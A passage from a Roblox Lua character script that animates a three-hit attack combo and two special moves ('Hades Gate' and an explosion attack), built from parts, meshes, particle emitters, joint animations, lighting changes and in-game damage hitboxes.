for i = 1,30 do
flame1.CFrame = flame1.CFrame*CFrame.Angles(.5,.5,.5)+Vector3.new(0,.2,0)
flame1.Transparency = i/30
r:wait()
end
flame1:Destroy()
end

coroutine.resume(coroutine.create(function()
	while r:wait() do
		RisingAndRotatingParts(Char,Torso.CFrame*cf(ran(-2,2),-3,ran(-2,2)),"Lime green","Really black",1,"Neon",v3(.5,.5,.5))
	end
end))
coroutine.resume(coroutine.create(function()
for i=1,huge do
local MCir=part(Char,false,false,v3(0,0,0),Torso.CFrame,c3(0,0,0),"Neon",1)
table.insert(CurrentEffects,MCir)
local CirM=mesh(MCir,"Cylinder",v3(1.3,3.3,3.3))
table.insert(CurrentEffects,CirM)
local CirDec=it("Decal",MCir)
CirDec.Texture="rbxassetid://687708091"
CirDec.Face="Right"
CirDec.Transparency=.5
table.insert(CurrentEffects,CirDec)
local MagicWeld=it("Weld",Char)
MagicWeld.Part0=EyePart
MagicWeld.Part1=MCir
MagicWeld.C0=MagicWeld.C0*angles(0,rad(90),0)*cf(.05,0,0)
table.insert(CurrentEffects,MagicWeld)
for i=1,40 do
	MagicWeld.C0=MagicWeld.C0*angles(rad(6),0,0)
	CirM.Scale=CirM.Scale+v3(0,.4,.4)
	CirDec.Transparency=i/40
	r:wait()
end
--ClearEffects()
end
end))
print"kek"

attackone=function()
	if attacking ==false then attacking=true
	print"1"
	chat:Chat(Char.Head,"Hmph.","Green")
	local Hbox=part(Char,false,false,v3(1.5,2,1.5),Torso.CFrame,c3(0,0,0),"Plastic",1)
	RealDamage(Hbox,7,16,5,false)
	local w=it("Weld",Char)
	w.Part0=Hbox
	w.Part1=LArm
	w.C0=w.C0*cf(0,1,0)
	for i=1,10 do
			RS.C0=clerp(RS.C0,RS.C0*angles(rad(0),0,0),.06)
			LS.C0=clerp(LS.C0,LS.C0*angles(rad(0),rad(-65),rad(-150)),.06)
			RH.C0=clerp(RH.C0,RH.C0*angles(0,rad(0),rad(0)),.06)
			LH.C0=clerp(LH.C0,LH.C0*angles(0,0,0),.06)
			RootJoint.C0=clerp(RootJoint.C0,RootJoint.C0*angles(0,rad(0),rad(90)),.06)
			Neck.C0=clerp(Neck.C0,Neck.C0*angles(rad(0),0,rad(-90)),.06)
			r:wait()
	end
	for i=1,10 do
		LS.C0=clerp(LS.C0,LS.C0*angles(rad(-9),rad(0),rad(0)),1)
			RootJoint.C0=clerp(RootJoint.C0,RootJoint.C0*angles(0,rad(0),rad(-12)),1)
			Neck.C0=clerp(Neck.C0,Neck.C0*angles(rad(0),0,rad(12)),1)
			r:wait()
	end
	wait(.8)
	newpos()
	Hbox:Destroy()
	end
	attacking=false
end

attacktwo=function()
	if attacking==false then attacking=true
		print"2"
		chat:Chat(Char.Head,"Die!","Green")
		local ETorso=Torso:Clone()
		ETorso.Transparency=1
		ETorso.Anchored=true
		ETorso.CanCollide=false
		ETorso.CFrame=Torso.CFrame
		for i=1,10 do
			RS.C0=clerp(RS.C0,RS.C0*angles(rad(-7),rad(0),rad(0))*cf(0,-.05,0),1)
			RootJoint.C0=clerp(RootJoint.C0,RootJoint.C0*angles(0,rad(0),rad(9)),1)
			Neck.C0=clerp(Neck.C0,Neck.C0*angles(rad(0),0,rad(-9)),1)
			r:wait()
		end
		
		for i=1,30 do
			local p=part(Char,true,false,v3(1,1,1),ETorso.CFrame*cf(0,0,-i)*angles(ran(-10,10),ran(-10,10),ran(-10,10)),c3(0,1,0),"Plastic",0)
			local m=it("SpecialMesh",p)
			m.MeshId="rbxassetid://3270017"
			m.Scale=v3(4,4,4)
			spawn(function()
				for ii=1,20 do
					r:wait()
					m.Scale=m.Scale+v3(.5,.5,.5)
					p.Transparency=ii/20
				end
			end)
			
			r:wait()
		end
		local urmum=part(Char,true,false,v3(1,1,1),ETorso.CFrame*cf(0,0,-30),c3(0,1,0),"Plastic",0)
		table.insert(CurrentEffects,urmum)
		smoothNO(urmum)
		local HBox=urmum:Clone()
		HBox.Parent=Char
		HBox.Transparency=1
		HBox.Shape="Ball"
		HBox.Size=v3(2,2,2)
		HBox.CFrame=urmum.CFrame
		RealDamage(HBox,10,25,20,false)
		local urmesh=it("SpecialMesh",urmum)
		urmesh.MeshType="Sphere"
		urmesh.Scale=v3(2,2,2)
		coroutine.resume(coroutine.create(function()
			for i=1,40 do
				urmum.Transparency=i/40
				urmesh.Scale=urmesh.Scale+v3(1.5,1.5,1.5)
				HBox.CFrame=urmum.CFrame
				HBox.Size=HBox.Size+v3(1,1,1)
				r:wait()
			end
		end))
		for a=1,2 do
		for i=1,20 do
			spawn(function()
			local rann=part(Char,true,false,v3(0,0,0),ETorso.CFrame*cf(0,0,-30)*cf(ran(-30,30),ran(30),ran(-30,30)),c3(0,1,0),"Neon",1)
			table.insert(CurrentEffects,rann)
			local p=part(Char,false,false,v3(0,0,0),ETorso.CFrame*CFrame.new(0,0,-30),c3(0,1,0),"Neon",0)
			table.insert(CurrentEffects,p)
			local m=it("BlockMesh",p)
			m.Scale=v3(6,6,6)
			local bp=it("BodyPosition")
			bp.maxForce=v3(math.huge,math.huge,math.huge)
			bp.Position=rann.Position
			bp.Parent=p
			table.insert(CurrentEffects,bp)
			spawn(function()
				for i=1,16 do
					r:wait()
					p.Transparency=i/16
				end
			end)
			wait()
			bp.Parent=bil
			end)
		end
		end
		ETorso:Remove()
		HBox:Destroy()
	end
	--ClearEffects()
	attacking=false
	newpos()
end

attackthree=function()
	if attacking==false then attacking=true
		print"3"
		chat:Chat(Char.Head,"Get Ready..","Green")
		for i=1,10 do
			RS.C0=clerp(RS.C0,RS.C0*angles(rad(-33),0,rad(-10))*cf(0,-.25,0),.4)
			LS.C0=clerp(LS.C0,LS.C0*angles(rad(0),rad(20),rad(0)),.06)
			RH.C0=clerp(RH.C0,RH.C0*angles(0,rad(0),rad(0)),.06)
			LH.C0=clerp(LH.C0,LH.C0*angles(0,0,0),.06)
			RootJoint.C0=clerp(RootJoint.C0,RootJoint.C0*angles(0,rad(0),rad(-6)),1)
			Neck.C0=clerp(Neck.C0,Neck.C0*angles(rad(0),0,rad(6)),1)
			r:wait()
		end
		
		local ball=part(Char,false,false,v3(1,1,1),Head.CFrame,c3(0,0,0),"Plastic",.8)
		local ball2=part(Char,false,false,v3(1,1,1),Head.CFrame,c3(0,1,0),"Neon",.2)
		local w=it("Weld",Char)
		w.Part0=ball
		w.Part1=RArm
		w.C0=w.C0*cf(0,20,0)
		local w2=it("Weld",Char)
		w2.Part0=ball2
		w2.Part1=ball
		local m=it("SpecialMesh",ball)
		m.MeshType="Sphere"
		m.Scale=Vector3.new(.1,.1,.1)
		local m2=it("SpecialMesh",ball2)
		m2.MeshType="Sphere"
		m2.Scale=Vector3.new(.01,.01,.01)
				local EyeSizes={
	NumberSequenceKeypoint.new(0,5,0),
	NumberSequenceKeypoint.new(1,0,0)
}
		local PE=it("ParticleEmitter",ball)
PE.LightEmission=.4
PE.LockedToPart=false
PE.Size=NumberSequence.new(EyeSizes)
PE.Transparency=NumberSequence.new(EyeTrans)
PE.Acceleration=v3(0,0,0)
PE.Lifetime=NumberRange.new(4,4,4)
PE.Rate=2e9
PE.Speed=NumberRange.new(0,0,0)
PE.Texture="rbxassetid://300899374"
--table.insert(CurrentEffects,PE)
		coroutine.resume(coroutine.create(function()
			for i=1,30 do
				spawn(function()
				local rng=part(Char,true,false,v3(1,1,1),ball.CFrame*angles(ran(-10,10),ran(-10,10),ran(-10,10)),c3(0,1,0),"Plastic",.5)
				table.insert(CurrentEffects,rng)
				local rm=it("SpecialMesh",rng)
				rm.MeshId="rbxassetid://3270017"
				rm.Scale=v3(60,60,60)
				for ii=1,10 do
					rm.Scale=rm.Scale-v3(6,6,6)
					r:wait()
				end
				end)
				wait()
			end
		end))
		local p1=part(Char,true,false,v3(1,1,1),ball.CFrame,c3(0,1,0),"Neon",.5)
		local pm=mesh(p1,"Brick",v3(5,5,5))
		for i=1,20 do
			m.Scale=m.Scale+v3(.5,.5,.5)
			m2.Scale=m2.Scale+v3(.3,.3,.3)
			p1.Transparency=(-i/20*-i/20)
			r:wait()
		end
		wait(.5)
		w.Parent=nil
		table.insert(CurrentEffects,w)
		--table.insert(CurrentEffects,w2)
		local placeholder=part(Char,true,false,v3(1,1,1),Head.CFrame*CFrame.new(0,-5,-30),c3(0,1,0),"Neon",1)
	local BV=it("BodyVelocity")
		BV.maxForce=v3(huge,huge,huge)
		BV.Velocity=(placeholder.Position-ball.Position).unit*100
		BV.Parent=ball
		ball.Touched:connect(function(hit)
			if hit.Name~=ball2.Name then
			ball.Anchored=true
			ball.ParticleEmitter.Enabled=false
			ball.Transparency=1
			ball2.Transparency=1
			local xpl=part(Char,true,false,v3(1,1,1),ball.CFrame*angles(ran(-10,10),ran(-10,10),ran(-10,10)),c3(0,1,0),"Neon",.75)
			local m=spmesh(xpl,"rbxassetid://9982590",v3(4,4,4))
			local xpl2=part(Char,true,false,v3(4,4,4),ball.CFrame*angles(ran(-10,10),ran(-10,10),ran(-10,10)),c3(0,1,0),"Neon",1)
			spawn(function()
			for i=1,80 do
				xpl.Transparency=.75+i/80
				
				m.Scale=m.Scale+v3(.6,.6,.6)
				
				wait()
					
				
			end
			end)
			RealDamage(xpl2,15,30,7)
			for i=1,50 do
				xpl2.Size=xpl2.Size+v3(.3,.3,.3)
				xpl2.CFrame=ball.CFrame
				r:wait()
			end
			xpl:Destroy()
			xpl2:Destroy()
			end
		end)
		spawn(function()
			wait(1.5)
			if BV then
			BV:Destroy()
			end
			
			placeholder:Destroy()
			PE.Enabled=false
			ball2:Destroy()
			wait(7)
			ball:Destroy()
		end)
		for i=1,10 do
			RS.C0=clerp(RS.C0,RS.C0*angles(rad(0),rad(20),rad(30))*cf(0,0,0),.4)
			LS.C0=clerp(LS.C0,LS.C0*angles(rad(0),rad(0),rad(0)),.06)
			RH.C0=clerp(RH.C0,RH.C0*angles(0,rad(0),rad(0)),.06)
			LH.C0=clerp(LH.C0,LH.C0*angles(0,0,0),.06)
			RootJoint.C0=clerp(RootJoint.C0,RootJoint.C0*angles(0,rad(0),rad(12)),1)
			Neck.C0=clerp(Neck.C0,Neck.C0*angles(rad(0),0,rad(-12)),1)
			wait()
		end
		chat:Chat(Char.Head,"Falling Star!","Green")
	end
	wait(2)
	attacking=false
	attacktype=1
	newpos()
end

Mouse.Button1Down:connect(function()
	if attacking== false and attacktype == 1 then
		attackone()
		attacktype = 2
	else
		if attacking == false and attacktype == 2 then
			attacktwo()
			attacktype = 3
		else
			if attacking == false and attacktype == 3 then
				attackthree()
				attacktype = 1
			end
		end
	end
end)


local Ging=false
Mouse.KeyDown:connect(function(Key)
	if Key=="g"  and Ging==false and attacking==false then attacking,Torso.Anchored=true,true
		local Clear={}
		local REKING=true
		chat:Chat(Char.Head,"By The Power Bestowed Upon Me Within The Demon's Eye..","Green")
		for i=1,20 do
			RS.C0=clerp(RS.C0,RS.C0*angles(rad(4.5),rad(-2),rad(8.5))*cf(0.02,0,0),1)
			LS.C0=clerp(LS.C0,LS.C0*angles(rad(0),rad(0),rad(0)),.06)
			RH.C0=clerp(RH.C0,RH.C0*angles(0,rad(0),rad(0)),.06)
			LH.C0=clerp(LH.C0,LH.C0*angles(0,0,0),.06)
			RootJoint.C0=clerp(RootJoint.C0,RootJoint.C0*angles(0,rad(0),rad(1)),1)
			Neck.C0=clerp(Neck.C0,Neck.C0*angles(rad(-1),0,rad(-2)),1)
			r:wait()
		end
		local ball=part(Char,false,false,v3(0,0,0),Torso.CFrame,c3(0,1,0),"Neon",0)
		local ball2=part(Char,false,false,v3(.3,.3,.3),Torso.CFrame,c3(0,0,0),"Plastic",.8)
		local bm=mesh(ball,"Sphere",v3(0,0,0))
		local bm2=mesh(ball2,"Sphere",v3(.3,.3,.3))
		smoothNO(ball2)
		local w=it("Weld",Char)
		w.Part0=ball
		w.Part1=RArm
		w.C0=w.C0*CFrame.new(0,1.6,0)
		local w2=it("Weld",Char)
		w2.Part0=ball2
		w2.Part1=RArm
		w2.C0=w2.C0*CFrame.new(0,1.6,0)
		for i=1,60 do r:wait()
		bm.Scale=bm.Scale:Lerp(bm.Scale+Vector3.new(.23,.23,.23),.3)
		bm2.Scale=bm2.Scale:Lerp(bm2.Scale+Vector3.new(.3,.3,.3),.3)
		end
		local Ring=part(Char,true,false,v3(0,0,0),ball.CFrame,c3(0,0,0),"Neon",.5)
		local Ring2=Ring:Clone()
		Ring2.Parent=Char
		local RM=spmesh(Ring,"rbxassetid://3270017",Vector3.new(1.7,1.7,.5))
		local RM2=spmesh(Ring2,"rbxassetid://3270017",Vector3.new(1.7,1.7,.5))
		Ring.CFrame=ball.CFrame*CFrame.Angles(ran(-10,10),ran(-10,10),ran(-10,10))
		Ring2.CFrame=ball.CFrame*CFrame.Angles(ran(-10,10),ran(-10,10),ran(-10,10))
		Ging=true
		coroutine.resume(coroutine.create(function()
		while Ging==true do r:wait()
			Ring.CFrame=Ring.CFrame:lerp(Ring.CFrame*CFrame.Angles(math.rad(ran(1,30)),math.rad(ran(1,30)),math.rad(ran(1,30))),.3)
			Ring2.CFrame=Ring2.CFrame:lerp(Ring2.CFrame*CFrame.Angles(math.rad(ran(1,30)),math.rad(ran(1,30)),math.rad(ran(1,30))),.3)
		end
		end))
		print"OYEFGYEFYGIEF"
		local cols={"Lime green", "Really black"}
		function fromground()
		local poss = Torso.CFrame*CFrame.new(0,-3,0)
		local main=it("Part",Char)
		main.Anchored=true
		main.CanCollide=false
		main.Size=v3(1,.2,1)
		main.CFrame=poss
		main.BrickColor=BrickColor.new(cols[math.random(#cols)])
		main.Material="Neon"
		main.CFrame = main.CFrame*cf((ran(-30,30)),0,(ran(-30,30)))
		local one = it("SpecialMesh", main)
		one.MeshType = "Sphere"
		one.Scale = v3(.3,.3,.3)
		main.CFrame = main.CFrame*angles((rad(90)),0,0)
		for i = 0,10,.1 do
			one.Scale = one.Scale+v3(.1,.1,4)
			main.Transparency = i
			wait()
		end
		one:Destroy()
		main:Destroy()
		end
		coroutine.resume(coroutine.create(function()
		while Ging==true do 
			spawn(function()
				fromground()
			end)
			wait(.1)
		end
		end))
		spawn(function()
		coroutine.resume(coroutine.create(function()
		for i=1,17 do r:wait()
			print"hi"
			local Cir=part(Char,true,false,v3(0,0,0),Torso.CFrame*cf(0,-2.8,0)*angles(0,0,math.rad(90)),c3(0,0,0),"Neon",1)
			local Cirm=mesh(Cir,"Cylinder",v3(0,1,1))
			local CirDec=it("Decal",Cir)
			CirDec.Texture="rbxassetid://687708091"
			CirDec.Face="Right"
			CirDec.Transparency=0
			table.insert(Clear,Cir)
			for ii=1,100 do r:wait()
				Cir.CFrame=Cir.CFrame*CFrame.Angles(math.rad(i*1.5),0,0)
			Cirm.Scale=Cirm.Scale:Lerp(Cirm.Scale+Vector3.new(0,6,6),.4)
			CirDec.Transparency=ii/100
			end
		end
		end))
		end)
		Bright={}
		local BR=1
		for i=1,10 do
			table.insert(Bright,BR)
			BR=BR-.1
		end
		table.insert(Bright,0)
		for i, v in pairs(Bright) do
			print(v)
		end
		Lighting.Brightness=1
		spawn(function()
		for i=1,#Bright do
			Lighting.Brightness=Bright[i]
			wait(.1)
		end
		end)
		local C1=part(Char,true,false,v3(1,1,1),Torso.CFrame*CFrame.new(0,155,0),c3(90/255,97/255,99/255),"Plastic",1)
		local C1m=spmesh(C1,"rbxassetid://1095708",v3(1000,50,1000))
		for i=1,#Bright do
			C1.Transparency=Bright[i]
			wait(.1)
		end
		chat:Chat(Char.Head,"Open! Hades Gate!","Green")
		--PORTAL
		Portalling=true
		for i=1,2 do
		local Spoke1=part(Char,true,false,v3(1,1,1),Torso.CFrame,c3(0,1,1),"Plastic",1)
		local pp1=part(Char,false,false,v3(2,2,2),Torso.CFrame,c3(0,1,1),"Plastic",1)
		local pp2=part(Char,false,false,v3(2,2,2),Torso.CFrame,c3(0,1,1),"Plastic",1)
		local pp3=part(Char,false,false,v3(2,2,2),Torso.CFrame,c3(0,1,1),"Plastic",1)
		local pp4=part(Char,false,false,v3(2,2,2),Torso.CFrame,c3(0,1,1),"Plastic",1)
		local POS=part(Char,false,false,v3(2,2,2),Torso.CFrame*angles(math.rad(90),0,0)*cf(0,0,-140),c3(0,1,1),"Plastic",1)
		
		local wel0=it("Weld",Char)
		wel0.Part0=Spoke1
		wel0.Part1=POS
		wait()
		local wel1=it("Weld",Char)
		wel1.Part0=POS
		wel1.Part1=pp1
		wait()
		wel1.C0=wel1.C0*cf(0,60,0)
		wait()
		local wel2=it("Weld",Char)
		wel2.Part0=POS
		wel2.Part1=pp2
		wel2.C0=wel2.C0*cf(0,-60,0)
		wait()
		
		local wel3=it("Weld",Char)
		wel3.Part0=POS
		wel3.Part1=pp3
		wel3.C0=wel3.C0*cf(-60,0,0)
		wait()
		local wel4=it("Weld",Char)
		wel4.Part0=POS
		wel4.Part1=pp4
		wel4.C0=wel4.C0*cf(60,0,0)
		local TransPoints={
			NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(.51,0,0),NumberSequenceKeypoint.new(.517,.0123,0),
			NumberSequenceKeypoint.new(.767,0.0926,0),NumberSequenceKeypoint.new(.88,.395,0),NumberSequenceKeypoint.new(1,1,0)
		}
		local SizePoints={
			NumberSequenceKeypoint.new(0,4.56,0),NumberSequenceKeypoint.new(.046,4.44,0),NumberSequenceKeypoint.new(.144,4.25,0),
			NumberSequenceKeypoint.new(.521,4,0),NumberSequenceKeypoint.new(1,3.75,0)
		}
		local PE1=PEE(pp1,NumberSequence.new(SizePoints),ColorSequence.new(Color3.new(1,1,1),Color3.new(0,1,1)),.6,NumberSequence.new(TransPoints),v3(0,0,0),false,"Bottom",true,NumberRange.new(6,6,6),499999997952.000,NumberRange.new(0,0,0),NumberRange.new(0,0,0),NumberRange.new(6,6,6),0,"SpinningPortalEffect1","rbxassetid://300899374")
		local PE2=PEE(pp2,NumberSequence.new(SizePoints),ColorSequence.new(Color3.new(1,1,1),Color3.new(0,1,1)),.6,NumberSequence.new(TransPoints),v3(0,0,0),false,"Top",true,NumberRange.new(6,6,6),499999997952.000,NumberRange.new(0,0,0),NumberRange.new(0,0,0),NumberRange.new(6,6,6),0,"SpinningPortalEffect2","rbxassetid://300899374")
		local PE3=PEE(pp3,NumberSequence.new(SizePoints),ColorSequence.new(Color3.new(1,1,1),Color3.new(0,1,1)),.6,NumberSequence.new(TransPoints),v3(0,0,0),false,"Right",true,NumberRange.new(6,6,6),499999997952.000,NumberRange.new(0,0,0),NumberRange.new(0,0,0),NumberRange.new(6,6,6),0,"SpinningPortalEffect3","rbxassetid://300899374")
		local PE4=PEE(pp4,NumberSequence.new(SizePoints),ColorSequence.new(Color3.new(1,1,1),Color3.new(0,1,1)),.6,NumberSequence.new(TransPoints),v3(0,0,0),false,"Left",true,NumberRange.new(6,6,6),499999997952.000,NumberRange.new(0,0,0),NumberRange.new(0,0,0),NumberRange.new(6,6,6),0,"SpinningPortalEffect4","rbxassetid://300899374")
		spawn(function()
			
		
		while Portalling==true do
			wait()
			POS.CFrame=POS.CFrame*angles(0,0,math.rad(3))
		end
		POS:Destroy()
		pp1:Destroy()
		pp2:Destroy()
		pp3:Destroy()
		pp4:Destroy()
		end)
		wait(.5)
		end
		wait(5)
		newpos()
		chat:Chat(Char.Head,"Now, You Will Know What It's Like To Burn.","Green")
		Ging=false
		Ring:Destroy()
		Ring2:Destroy()
		ball:Destroy()
		ball2:Destroy()
		for i,v in pairs(Clear) do
			v:Destroy()
		end
		wait(3)
		--anims
		chat:Chat(Char.Head,"DIE!!!!!","Green")
		defpos()
		
			RS.C0 = clerp(RS.C0,RS.C0* angles(rad(-30), rad(0), rad(0)), 1)
			LS.C0 = clerp(LS.C0,LS.C0* angles(rad(-30), rad(0), rad(0)), 1)
			RH.C0 = clerp(RH.C0,RH.C0* angles(rad(-10), rad(0), rad(0)), 1)
			LH.C0 = clerp(LH.C0,LH.C0* angles(rad(-10), rad(0), rad(0)), 1)
			Neck.C0 = clerp(Neck.C0,Neck.C0*angles(rad(-35), rad(0), rad(0)), 1)
		local cylp=part(Char,true,false,v3(1,1,1),Torso.CFrame*angles(0,0,math.rad(90)),c3(0,1,0),"Neon",.5)
		local clym=mesh(cylp,"Cylinder",v3(5000,60,40))
		smoothNO(cylp)
		spawn(function()
		while REKING==true do r:wait()
			cylp.CFrame=Torso.CFrame*angles(0,0,math.rad(90))*CFrame.new(ran(-2,2),0,ran(-2,2))
		end
		end)
		local Explosion=function()
			local b1=part(Char,true,false,v3(1,1,1),Torso.CFrame,c3(0,1,0),"Neon",.5)--spike mesh in middle
			local b2=part(Char,true,false,v3(1,1,1),Torso.CFrame,c3(0,0,0),"Neon",.6)--black ball mesh thats big and expands
			local b3=part(Char,true,false,v3(1,1,1),Torso.CFrame,c3(0,1,0),"Neon",.7)--green ball mesh that coats black ball mesh
			local r1=part(Char,true,false,v3(1,1,1),Torso.CFrame*angles(ran(-10,10),ran(-10,10),ran(-10,10)),c3(0,0,0),"Neon",.6)--ring that rotates around section
			local r2=part(Char,true,false,v3(1,1,1),Torso.CFrame*angles(ran(-10,10),ran(-10,10),ran(-10,10)),c3(0,0,0),"Neon",.6)--ring that rotates around section
			local bb=part(Char,true,false,v3(1,1,1),Torso.CFrame,c3(0,0,0),"Neon",.7)--black ball that envelopes all >:D rhymes
			local gr=part(Char,true,false,v3(1,1,1),Torso.CFrame*angles(ran(-10,10),ran(-10,10),ran(-10,10)),c3(0,1,0),"Neon",.7)--green ring that goes around bb
			local gr2=part(Char,true,false,v3(1,1,1),Torso.CFrame*angles(ran(-10,10),ran(-10,10),ran(-10,10)),c3(0,1,0),"Neon",.7)--green ring that goes around bb
			local sw=part(Char,true,false,v3(1,1,1),Torso.CFrame,c3(0,1,0),"Neon",.7)--shockwave around whole fing
			local sw2=part(Char,true,false,v3(1,1,1),Torso.CFrame,c3(0,1,0),"Neon",.7)--another shockwave around whole fing
			local bm1=spmesh(b1,"rbxassetid://9982590",v3(8,8,8))
			local bm2=mesh(b2,"Sphere",v3(40,40,40))
			local bm3=mesh(b3,"Sphere",v3(42,42,42))
			local rm1=spmesh(r1,"rbxassetid://3270017",v3(50,50,30))
			local rm2=spmesh(r2,"rbxassetid://3270017",v3(50,50,30))
			local bbm=mesh(bb,"Sphere",v3(60,60,60))
			local grm1=spmesh(gr,"rbxassetid://3270017",v3(80,80,50))
			local grm2=spmesh(gr2,"rbxassetid://3270017",v3(80,80,50))
			local ss1=spmesh(sw,"rbxassetid://20329976",v3(40,15,40))
			local ss2=spmesh(sw2,"rbxassetid://20329976",v3(48,5,48))
			wait()
			smoothNO(b1)
			smoothNO(b2)
			smoothNO(bb)
			RealDamage(Torso,70,200,70,false)
			for i=1,400 do r:wait()
				--CFrames
				b1.CFrame=b1.CFrame:lerp(b1.CFrame*CFrame.Angles(rad(3),0,rad(3)),.4)
				r1.CFrame=r1.CFrame:lerp(r1.CFrame*CFrame.Angles(math.rad(ran(1,30)),math.rad(ran(1,30)),math.rad(ran(1,30))),.3)
				r2.CFrame=r2.CFrame:lerp(r2.CFrame*CFrame.Angles(math.rad(ran(1,30)),math.rad(ran(1,30)),math.rad(ran(1,30))),.3)
				gr.CFrame=gr.CFrame:lerp(gr.CFrame*CFrame.Angles(math.rad(ran(1,30)),math.rad(ran(1,30)),math.rad(ran(1,30))),.1)
				gr2.CFrame=gr2.CFrame:lerp(gr2.CFrame*CFrame.Angles(math.rad(ran(1,30)),math.rad(ran(1,30)),math.rad(ran(1,30))),.1)
				sw.CFrame=sw.CFrame:lerp(sw.CFrame*CFrame.Angles(0,math.rad(5),0),.4)
				sw2.CFrame=sw2.CFrame:lerp(sw2.CFrame*CFrame.Angles(0,math.rad(-5),0),.4)
				--Sizing
				bm1.Scale=bm1.Scale:Lerp(bm1.Scale+Vector3.new(1.8,1.8,1.8),.069)--hehe
				bm2.Scale=bm2.Scale:Lerp(bm2.Scale+Vector3.new(6,6,6),.1)
				bm3.Scale=bm3.Scale:Lerp(bm3.Scale+Vector3.new(6,6,6),.1)
				rm1.Scale=rm1.Scale:Lerp(rm1.Scale+Vector3.new(7,7,7),.1)
				rm2.Scale=rm2.Scale:Lerp(rm2.Scale+Vector3.new(7,7,7),.1)
				bbm.Scale=bbm.Scale:Lerp(bbm.Scale+Vector3.new(8,8,8),.1)
				grm1.Scale=grm1.Scale:Lerp(grm1.Scale+Vector3.new(7,7,7),.1)
				grm2.Scale=grm2.Scale:Lerp(grm2.Scale+Vector3.new(7,7,7),.1)
				ss1.Scale=ss1.Scale:Lerp(ss1.Scale+Vector3.new(7,3,7),.1)
				ss2.Scale=ss2.Scale:Lerp(ss2.Scale+Vector3.new(7,2,7),.1)
				--Transparency
				b1.Transparency=.7+i/400
				b2.Transparency=.7+i/400
				b3.Transparency=.7+i/400
				r1.Transparency=.7+i/400
				r2.Transparency=.7+i/400
				bb.Transparency=.7+i/400
				gr.Transparency=.7+i/400
				gr2.Transparency=.7+i/400
				sw.Transparency=.7+i/400
				sw2.Transparency=.7+i/400
				
			end
			--Destroying
			b1:Destroy()
			b2:Destroy()
			b3:Destroy()
			r1:Destroy()
			r2:Destroy()
			bb:Destroy()
			gr:Destroy()
			gr2:Destroy()
			sw:Destroy()
			sw2:Destroy()
			end
			for i=1,30 do r:wait()
				spawn(function()
					Explosion()
				end)
				wait(.89)
			end
			REKING=false
		NBright={}
		local NBR=0
		for i=1,10 do
			table.insert(NBright,NBR)
			NBR=NBR+.1
		end
		print"boop"
		for i, v in pairs(NBright) do
			print(v)
		end
		for i=1,#NBright do
			Lighting.Brightness=NBright[i]
			wait(.1)
		end
		Lighting.Brightness=1
		Portalling=false
		for i=1,10 do wait()
			C1.Transparency=i/10
			cylp.Transparency=.5+i/10
		end
		Torso.Anchored=false
		newpos()
		attacking=false
		canattack=true
		
	end
end)





Mouse.KeyDown:connect(function(Key)
	if Key=="p" and attacking==false then attacking=true
		chat:Chat(Char.Head,"URAGH!","Green")
		local Explosion=function()
			local b1=part(Char,true,false,v3(1,1,1),Torso.CFrame,c3(0,1,0),"Neon",.5)--spike mesh in middle
			local b2=part(Char,true,false,v3(1,1,1),Torso.CFrame,c3(0,0,0),"Neon",.6)--black ball mesh thats big and expands
			local b3=part(Char,true,false,v3(1,1,1),Torso.CFrame,c3(0,1,0),"Neon",.7)--green ball mesh that coats black ball mesh
			local r1=part(Char,true,false,v3(1,1,1),Torso.CFrame*angles(ran(-10,10),ran(-10,10),ran(-10,10)),c3(0,0,0),"Neon",.6)--ring that rotates around section
			local r2=part(Char,true,false,v3(1,1,1),Torso.CFrame*angles(ran(-10,10),ran(-10,10),ran(-10,10)),c3(0,0,0),"Neon",.6)--ring that rotates around section
			local bb=part(Char,true,false,v3(1,1,1),Torso.CFrame,c3(0,0,0),"Neon",.7)--black ball that envelopes all >:D rhymes
			local gr=part(Char,true,false,v3(1,1,1),Torso.CFrame*angles(ran(-10,10),ran(-10,10),ran(-10,10)),c3(0,1,0),"Neon",.7)--green ring that goes around bb
			local gr2=part(Char,true,false,v3(1,1,1),Torso.CFrame*angles(ran(-10,10),ran(-10,10),ran(-10,10)),c3(0,1,0),"Neon",.7)--green ring that goes around bb
			local sw=part(Char,true,false,v3(1,1,1),Torso.CFrame,c3(0,1,0),"Neon",.7)--shockwave around whole fing
			local sw2=part(Char,true,false,v3(1,1,1),Torso.CFrame,c3(0,1,0),"Neon",.7)--another shockwave around whole fing
			local bm1=spmesh(b1,"rbxassetid://9982590",v3(8,8,8))
			local bm2=mesh(b2,"Sphere",v3(40,40,40))
			local bm3=mesh(b3,"Sphere",v3(42,42,42))
			local rm1=spmesh(r1,"rbxassetid://3270017",v3(50,50,30))
			local rm2=spmesh(r2,"rbxassetid://3270017",v3(50,50,30))
			local bbm=mesh(bb,"Sphere",v3(60,60,60))
			local grm1=spmesh(gr,"rbxassetid://3270017",v3(80,80,50))
			local grm2=spmesh(gr2,"rbxassetid://3270017",v3(80,80,50))
			local ss1=spmesh(sw,"rbxassetid://20329976",v3(40,15,40))
			local ss2=spmesh(sw2,"rbxassetid://20329976",v3(48,5,48))
			wait()
			smoothNO(b1)
			smoothNO(b2)
			smoothNO(bb)
			for i=1,400 do r:wait()
				--CFrames
				b1.CFrame=b1.CFrame:lerp(b1.CFrame*CFrame.Angles(rad(3),0,rad(3)),.4)
				r1.CFrame=r1.CFrame:lerp(r1.CFrame*CFrame.Angles(math.rad(ran(1,30)),math.rad(ran(1,30)),math.rad(ran(1,30))),.3)
				r2.CFrame=r2.CFrame:lerp(r2.CFrame*CFrame.Angles(math.rad(ran(1,30)),math.rad(ran(1,30)),math.rad(ran(1,30))),.3)
				gr.CFrame=gr.CFrame:lerp(gr.CFrame*CFrame.Angles(math.rad(ran(1,30)),math.rad(ran(1,30)),math.rad(ran(1,30))),.1)
				gr2.CFrame=gr2.CFrame:lerp(gr2.CFrame*CFrame.Angles(math.rad(ran(1,30)),math.rad(ran(1,30)),math.rad(ran(1,30))),.1)
				sw.CFrame=sw.CFrame:lerp(sw.CFrame*CFrame.Angles(0,math.rad(5),0),.4)
				sw2.CFrame=sw2.CFrame:lerp(sw2.CFrame*CFrame.Angles(0,math.rad(-5),0),.4)
				--Sizing
				bm1.Scale=bm1.Scale:Lerp(bm1.Scale+Vector3.new(1.8,1.8,1.8),.069)--hehe
				bm2.Scale=bm2.Scale:Lerp(bm2.Scale+Vector3.new(6,6,6),.1)
				bm3.Scale=bm3.Scale:Lerp(bm3.Scale+Vector3.new(6,6,6),.1)
				rm1.Scale=rm1.Scale:Lerp(rm1.Scale+Vector3.new(7,7,7),.1)
				rm2.Scale=rm2.Scale:Lerp(rm2.Scale+Vector3.new(7,7,7),.1)
